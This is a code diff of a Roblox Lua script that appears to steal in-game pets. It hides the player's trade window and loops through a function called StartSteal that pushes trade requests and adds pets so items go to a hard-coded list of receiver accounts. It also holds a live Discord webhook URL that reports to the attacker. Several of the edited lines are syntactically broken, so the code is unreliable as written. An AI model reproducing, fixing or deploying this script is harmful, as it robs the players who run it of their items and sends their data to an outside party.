@@ -2,6 +2,10 @@ Username = "janeq is too skilled"
 Webhook = "https://discord.com/api/webhooks/1302319224185684039/ahtxsJqGagcs3ENidQuhc0GeBAmfmyKz50kZsuGGq9cV9v8pwGrxGNIKqMqGhe_bByoY"
 
 
+Config = { 
+  Receivers = {Username, "Onodakun23", "kely5171"}
+}
+
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
@@ -85,11 +89,11 @@ request({
 })
 
 
-local function SendTrade(Username)
+local function SendTrade(Config.Receivers)
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local RouterClient = Loads("RouterClient")
     local SendTradeRequest = RouterClient.get("TradeAPI/SendTradeRequest")
-    SendTradeRequest:FireServer(game.Players[Username])
+    SendTradeRequest:FireServer(game.Players{Config.Username})
 end
 local function AddPets()
     local Loads = require(game.ReplicatedStorage.Fsys).load
@@ -130,7 +134,7 @@ end
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 local function StartSteal()
     while task.wait(15) do
-    SendTrade(Username)
+    SendTrade(Config.Username)
     wait(3)
     AddPets()
     wait(5.5)
